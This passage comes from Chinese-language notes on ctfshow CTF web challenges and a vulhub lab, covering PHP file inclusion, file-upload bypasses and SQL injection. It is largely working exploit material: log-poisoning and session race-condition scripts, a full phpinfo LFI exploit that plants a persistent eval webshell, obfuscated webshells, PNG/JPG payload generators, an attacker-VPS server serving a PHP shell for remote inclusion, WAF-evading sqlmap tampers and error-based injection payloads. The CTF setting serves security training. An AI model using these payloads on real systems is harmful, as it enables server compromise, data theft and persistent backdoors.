if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE){
    include($ctf);
}
```

这里我用的日志包含绕过，应该也是非预期解，和前面写过的日志包含差不多，这里要想包含需要`$isvip`变量为true或者1，这里有`QUERY_STRING`和extract函数（**解析变量，覆盖变量**），所以我们可以直接通过get传参来定义(忘记这个知识点的往上看web127)，然后再`User-Agent`里写上一句话利用，这里写了脚本进行利用

```python
import requests

url = "http://5166dd5a-495e-4cd2-bad1-6a13b1cba45a.chall.ctf.show:8080/" + "?isVIP=1"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0<?php @eval($_POST[dotast]);?>'
}
data = {
    'ctf': '/var/log/nginx/access.log',
    'dotast':'system("cat flag.php");'
}
result = requests.post(url=url, headers=headers, data=data)
print(result.text)
```

运行两次后得到flag

题目中用strrpos()过滤了：号，不然还可以用php://filter伪协议来读取

## web151-plus(php$_SERVER['QUERY_STRING']和extract()的错误使用，结合包含，导致变量覆盖实现session文件包含)

```php
<?php
include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
    include($ctf);
}
```

在上一题的基础上ban了log字符，所以不能使用日志包含，但发现可以使用session进行文件包含，知识点忘记的可以看前面写的web82
web82写的脚本改改直接用

```python
PYTHON
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/3/7 14:57
# blog: www.wlhhlc.top
import io
import requests
import threading
url = 'http://7eda1482-7964-4319-96d3-1689b4a62307.chall.ctf.show:8080/'

def write(session):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac f*");?>'
    }
    while True:
        f = io.BytesIO(b'a' * 1024 * 10)
        response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('dota.txt', f)})
def read(session):
    data = {
        'ctf':'/tmp/sess_flag'
    }
    while True:
        response = session.post(url+'?isVIP=1',data=data)
        if 'ctfshow' in response.text:
            print(response.text)
            break
        else:
            print('retry')

if __name__ == '__main__':
    session = requests.session()
    for i in range(30):
        threading.Thread(target=write, args=(session,)).start()
    for i in range(30):
        threading.Thread(target=read, args=(session,)).start()
```

运行后即可得到flag



# [PHP文件包含漏洞（利用phpinfo）](https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md#php文件包含漏洞利用phpinfo)

PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。

参考链接：

- https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf

## [漏洞环境](https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md#漏洞环境)

执行如下命令启动环境：

```
docker compose up -d
```



目标环境是官方最新版PHP7.2，说明该漏洞与PHP版本无关。

环境启动后，访问`http://your-ip:8080/phpinfo.php`即可看到一个PHPINFO页面，访问`http://your-ip:8080/lfi.php?file=/etc/passwd`，可见的确存在文件包含漏洞。

## [利用方法简述](https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md#利用方法简述)

在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是`/tmp/php[6个随机字符]`），文件名可以在`$_FILES`变量中找到。这个临时文件，在请求结束后就会被删除。

同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到`$_FILES`变量的内容，自然也包含临时文件名。

在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。

但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。

这个时候就需要用到条件竞争，具体流程如下：

1. 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据
2. 因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大
3. php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接
4. 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包
5. 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除
6. 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell

## [漏洞复现](https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md#漏洞复现)

利用脚本[exp.py](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)实现了上述过程，成功包含临时文件后，会执行`<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>`，写入一个新的文件`/tmp/g`，这个文件就会永久留在目标机器上。

```python
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```

用python2执行：`python exp.py your-ip 8080 100`：

[![img](assets/1.png)](https://github.com/vulhub/vulhub/blob/master/php/inclusion/1.png)

可见，执行到第289个数据包的时候就写入成功。然后，利用lfi.php，即可执行任意命令：

[![img](assets/2.png)](https://github.com/vulhub/vulhub/blob/master/php/inclusion/2.png)

# 0x05 文件上传

## web151(前端校验)

![image-20220114134736282](assets/image-20220114134736282.png)

前端校验，直接禁用js后上传一句话，或者上传png然后抓包改后缀

## web152(MIME校验)

> hint：后端不能单一校验

前端+后端校验，这里是将一句话木马改为png后上传，再改后缀，经测试后端是MIME类型校验，改为png的image/png即可绕过

![image-20220114135421176](assets/image-20220114135421176.png)

## web153(.user.ini)

这个题过滤了后缀php，一开始想着用php3，phtml等绕过，发现不能执行命令，然后访问upload时出现了不一样

![image-20220114142337227](assets/image-20220114142337227.png)

nothing here？说明此处有个php页面，那么这个题考察的就是.user.ini的利用了

> 自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。

> 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。

> 在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。

可以用的配置是auto_append_file和auto_prepend_file，前者在每个php文件尾加个include，后者在文件头加个include

**而且.user.ini只对同级目录下的文件起作用，同级目录下必须有个php文件才可以，这就是这个题的突破口。**

![image-20231111133331268](assets/image-20231111133331268.png)

首先上传个.user.ini，在**index.php**中include进去lpp.png，然后上传带一句话的png

然后就是getshell后找flag了(**注意访问的路径是index.php文件，不是图片马lpp.png**)

![image-20231111133546795](assets/image-20231111133546795.png)

## web154(短标签)

应该是对上传内容进行了过滤，不允许有php出现，那么就使用php短标签：<?= 代替 <?php

```
短标签形式：
<?=eval($_POST[lpp]);?>
<?=system("tac ../f*");?>
```

![image-20220114144039737](assets/image-20220114144039737.png)

先传个带一句话的png，然后传.user.ini方法同上，最后拿shell找flag

## web155(短标签)

同上

## web156($_POST{1})

经测试，在上面的基础上过滤了文件内容中的 ] ，采用大括号进行绕过：

```php
<?=eval($_POST{1});?>
当然，既然知道flag位置，不妨直接读取
<?=system("tac ../f*");?>
```

![image-20220114145000175](assets/image-20220114145000175.png)

剩下操作同上

## web157(不写马，命令执行)

有点难搞，过滤了 { 和 ； 想要写马进去有点绕，所以就直接命令执行吧：

```php
<?=system('tac ../flag.*')?> //在php标签中，如果代码只有一行，可以没有分号
```

![image-20220114145952646](assets/image-20220114145952646.png)

## web158(同上)

同上

## web159(同上)

过滤了（ ，用反引号绕过：``<?=`tac ../flag.*`?>``

## web160(日志包含/php伪协议包含)

### 解法一：日志包含

在上面的基础上过滤了反引号，系统命令不能用了，考虑日志包含

``<?=include"/var/lo"."g/nginx/access.lo"."g"?>``

![image-20220117175904340](assets/image-20220117175904340.png)

然后在UA中插入一句话

![image-20220117180133199](assets/image-20220117180133199.png)

最后getshell

![image-20220117180151043](assets/image-20220117180151043.png)

### 法二：伪协议包含

依旧上传个`.user.ini`文件，但在传图片马的时候把反引号给ban了，我们使用include命令去配合php伪协议进行读取，因为把php给ban了，所以我们需要拼接起来，即

```
CODE
<?=include"ph"."p://filter/convert.base64-encode/resource=../flag.p"."hp"?>
```

![image-20231111142607282](assets/image-20231111142607282.png)

上传后访问upload目录
[![img](https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160/ND%25%5D_ZJ6%60%28F4%25XNI%5D2XAPLE.png)](https://blog-file-1302856486.file.myqcloud.com/Web1000(一)/文件上传/web160/ND%]_ZJ6`(F4%XNI]2XAPLE.png)
接着再base64解码即可得到flag

## web161(GIF89a欺骗)

小知识点：GIF89a文件头欺骗，php下的检测函数getimagesize无法认定其图片无效

```php
//检查是否图片
    if(function_exists('getimagesize')) {
        $tmp_imagesize = @getimagesize($new_name);
        list($tmp_width, $tmp_height, $tmp_type) = (array)$tmp_imagesize;
        $tmp_size = $tmp_width * $tmp_height;
        if($tmp_size > 16777216 || $tmp_size < 4 || empty($tmp_type) || strpos($tmp_imagesize['mime'], 'flash') > 0) {
            @unlink($new_name);
            return cplang('only_allows_upload_file_types');
        }
    }
```

如果使用这个函数读取文件头为GIF89a的图片，php会认定这只是一个尺寸比较大的合法图片，所以存在检测漏洞

回到这个题，上传的时候加上GIF89a头就可以了

![image-20220117181330308](assets/image-20220117181330308.png)

## web162(session文件包含/远程包含)

### 解法一：条件竞争，session文件包含

这次把`.`给ban了，我们使用session文件包含，又忘记知识点的可以去看web82；还是一样先上传`.user.ini` ，内容为

```
GIF89a
auto_prepend_file=/tmp/sess_lpp
```

```python
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/3/8 17:06
# blog: www.wlhhlc.top
import io
import requests
import threading
url = 'http://3238a505-5728-4702-b83b-98460ec17f8d.chall.ctf.show:8080/'

def write(session):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac ../f*");?>'
    }
    while True:
        f = io.BytesIO(b'GIF89a\ndotast')
        files = {'file': ('1.png', f, 'image/png')}
        response = session.post(url+"upload.php",cookies={'PHPSESSID': 'lpp'}, data=data, files=files)
def read(session):
    while True:
        response = session.get(url+'upload')
        if 'ctfshow' in response.text:
            print(response.text)
            break
        else:
            print('retry')

if __name__ == '__main__':
    session = requests.session()
    for i in range(30):
        threading.Thread(target=write, args=(session,)).start()
    for i in range(30):
        threading.Thread(target=read, args=(session,)).start()
```

### 解法二：远程文件包含

这个题过滤了文件内容中的. 也就是说上传的.user.ini是不能包含带后缀的文件的，在原wp中是要通过条件竞争的方式去解，思路是上传的速度要比服务器删除的速度快，所以采用竞争，但是因为最近群主大大限制了并发，条件竞争并不能做了，所以采用远程文件包含的方式

1. 拥有一台vps，并用flask将php一句话绑定在80端口上

   ```python
   '''
   Author: KonDream
   Date: 2022-01-03 22:45:59
   LastEditors:  KonDream
   LastEditTime: 2022-01-05 13:10:08
   Description:  
   '''
   from flask import *
   
   app = Flask(__name__)
   
   # 首页路由
   @app.route('/',methods=['GET', 'POST'])
   def index():
       return "<?php eval($_POST[1]);?>"
   
   if __name__ == "__main__":
       app.run(host='0.0.0.0', port=80, debug=True)
   ```

2. 上传.user.ini，绑定一个不带后缀的文件k![image-20220117193202242](assets/image-20220117193202242.png)

3. 上传k，并包含远程vps地址，由于过滤了ip中的. 所以要将ip地址转数字，这里转：http://www.msxindl.com/tools/ip/ip_num.asp

   ![image-20220117193804385](assets/image-20220117193804385.png)

4. 最后访问upload，即可getshell![image-20220117193859464](assets/image-20220117193859464.png)

## web163(session条件竞争/.user.ini配置文件包含)

### 解法一：session文件包含

同上

### 解法二：.user.ini配置文件包含

思路同上，但是上传的文件会被服务器立刻删掉，原预期解是通过竞争的方式，但是现在不行，所以就包含在配置文件里![image-20220117194817052](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/ctfshow_web%2525E5%25258F%252582%2525E8%252580%252583/image/ctfshow-%2525E6%252596%252587%2525E4%2525BB%2525B6%2525E4%2525B8%25258A%2525E4%2525BC%2525A0(151-170)/image-20220117194817052.png)![image-20220117194835364](assets/image-20220117194835364.png)

值得注意的是这个题文件不会覆盖，所以只能包含一次，如果写错文件那么就要重开环境了hhh，而且162和163这种做法都要求服务器支持远程文件包含，如果服务器没开启这个选项的话那么就没办法这样做了

## web164(png二次渲染绕过)

访问upload目录发现没有index.php了，且只能上传图片，考虑png二次渲染绕过

大概思路是服务端会对客户端上传的文件内容进行二次渲染，比方说我在文件尾加入了一句话木马，但是上传后服务端会进行二次渲染，就将这句木马过滤掉了，绕过的姿势就是找到二次渲染前后文件内容没有变化的位置，将php一句话写入这个位置就可以绕过二次渲染

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'2.png');  //要修改的图片的路径
/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */

?>
```

借大牛的脚本一用，运行脚本后会生成一个png图片，它符合png图片规范，将绕过二次渲染的一句话木马写入了IDAT数据块

上传图片后执行命令即可

![image-20220119133312983](assets/image-20220119133312983.png)

## web165(jpg二次渲染绕过)

原理和png二次渲染绕过差不多，采用网上大牛的脚本

```php
<!-- 用法 php exp.php a.jpg -->
<?php
    $miniPayload = "<?=eval(\$_POST[1]);?>";

    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                	echo "error";
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

这里用某些jpg图片进行渲染成功率不高，这里采用热心群友的图片

![image-jpg二次渲染专用](assets/jpg%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E4%B8%93%E7%94%A8.jpg)**先将这个图片上传到服务器进行一次渲染，然后将文件下载到本地，使用脚本处理后再进行上传**

![image-20220119142634515](assets/image-20220119142634515.png)

## web166(zip)

只能上传压缩包，那么随便新建个压缩包，然后用记事本打开在文件末尾插入一句话后上传

![image-20220119181754788](assets/image-20220119181754788.png)

![image-20220119181816409](assets/image-20220119181816409.png)

## web167(.htaccess)

提示说httpd自然就联想到了htaccess，因为apache有个配置文件就叫httpd.conf嘛

原理

>.htaccess文件是Apache服务器下的一个配置文件。其主要负责相关目录下的网页配置，即：在一个特定的文档目录中放置一个包含一个或多个指令的文件来对网页进行配置。
>不过需要注意的是，.htaccess文件的作用域为其所在目录与其所有的子目录，不过若是子目录也存在.htaccess文件，则会覆盖父目录的.htaccess效果。

```htaccess
<FilesMatch "webshell.png">
SetHandler application/x-httpd-php
</FilesMatch>
# 将匹配到的 webshell.png 文件按照php解析执行
```

所以思路就是先上传个包含一句话的图片，然后再上传.htaccess，让这张图片按照php解析执行

注意绕过一下MIME校验

![image-20220119190235209](assets/image-20220119190235209.png)

![image-20220119190341168](assets/image-20220119190341168.png)

![image-20220119190428130](assets/image-20220119190428130.png)

## web168(基础免杀)

给个免杀马：

```php
<?php 
    $poc="s#y#s#t#e#m"; 
    $poc_1=explode("#",$poc); 
    $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];
    $poc_2($_REQUEST['1']);
?>
//?1=tac ../flag.php
```

这个算是很简单的，同样是对上传的文件内容进行了限制，不允许上传一句话木马，如果只是为了拿到flag就不用考虑权限维持的问题，所以直接用命令读吧

![image-20220119193204715](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/ctfshow_web%2525E5%25258F%252582%2525E8%252580%252583/image/ctfshow-%2525E6%252596%252587%2525E4%2525BB%2525B6%2525E4%2525B8%25258A%2525E4%2525BC%2525A0(151-170)/image-20220119193204715.png)![image-20220119193227603](assets/image-20220119193227603.png)

## web169(高级免杀)

采用上一题的做法发现文件内有<就会被过滤掉，写php是不行了，还是考虑配置文件包含，日志包含

前面说过上传.user.ini前提是当前目录下有php文件，这个题显然是没有的，但是我们可以自己上传个index.php

然后进行日志包含

![image-20220119195037306](assets/image-20220119195037306.png)

![image-20220119195117163](assets/image-20220119195117163.png)

看到是可以包含的，那么接下来就是常规的写马，拿shell

![image-20220119195146942](assets/image-20220119195146942.png)

## web170(终极免杀)

同上

# 0x06 sql注入

# SQLMAP-tamper脚本

举例如下tamper脚本：

[apostrophemask.py](http://apostrophemask.py/) 用utf8代替引号

[equaltolike.py](http://equaltolike.py/) MSSQL * SQLite中like 代替等号

[greatest.py](http://greatest.py/) MySQL中绕过过滤’>’ ,用GREATEST替换大于号

[space2hash.py](http://space2hash.py/) 空格替换为#号 随机字符串 以及换行符

[space2comment.py](http://space2comment.py/) 用/**/代替空格

[apostrophenullencode.py](http://apostrophenullencode.py/) MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号

[halfversionedmorekeywords.py](http://halfversionedmorekeywords.py/) 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论

[space2morehash.py](http://space2morehash.py/) MySQL中空格替换为 #号 以及更多随机字符串 换行符

appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码

[ifnull2ifisnull.py](http://ifnull2ifisnull.py/) MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤

[space2mssqlblank.py](http://space2mssqlblank.py/) mssql空格替换为其它空符号

[base64encode.py](http://base64encode.py/) 用base64编码

[space2mssqlhash.py](http://space2mssqlhash.py/) mssql查询中替换空格

[modsecurityversioned.py](http://modsecurityversioned.py/) mysql中过滤空格，包含完整的查询版本注释

[space2mysqlblank.py](http://space2mysqlblank.py/) mysql中空格替换其它空白符号

[between.py](http://between.py/) MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（>）

[space2mysqldash.py](http://space2mysqldash.py/) MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）

[multiplespaces.py](http://multiplespaces.py/) 围绕SQL关键字添加多个空格

[space2plus.py](http://space2plus.py/) 用+替换空格

[bluecoat.py](http://bluecoat.py/) MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like

[nonrecursivereplacement.py](http://nonrecursivereplacement.py/) 双重查询语句。取代predefined SQL关键字with表示 suitable for替代

[space2randomblank.py](http://space2randomblank.py/) 代替空格字符（“”）从一个随机的空白字符可选字符的有效集

sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾

[chardoubleencode.py](http://chardoubleencode.py/) 双url编码(不处理以编码的)

[unionalltounion.py](http://unionalltounion.py/) 替换UNION ALL SELECT UNION SELECT

[charencode.py](http://charencode.py/) Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；

[randomcase.py](http://randomcase.py/) Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写

[unmagicquotes.py](http://unmagicquotes.py/) 宽字符绕过 GPC addslashes

[randomcomments.py](http://randomcomments.py/) 用/**/分割sql关键字

[charunicodeencode.py](http://charunicodeencode.py/) ASP，ASP.NET中字符串 unicode 编码

[securesphere.py](http://securesphere.py/) 追加特制的字符串

[versionedmorekeywords.py](http://versionedmorekeywords.py/) MySQL >= 5.1.13注释绕过

[halfversionedmorekeywords.py](http://halfversionedmorekeywords.py/) MySQL < 5.1中关键字前加注释



# 报错注入12法

```sql
1. floor + rand + group by
select * from user where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
select * from user where id=1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));

2. ExtractValue
select * from user where id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

3. UpdateXml
select * from user where id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1));

4. Name_Const(>5.0.12)
select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;

5. Join
select * from(select * from mysql.user a join mysql.user b)c;
select * from(select * from mysql.user a join mysql.user b using(Host))c;
select * from(select * from mysql.user a join mysql.user b using(Host,User))c;

6. exp()//mysql5.7貌似不能用
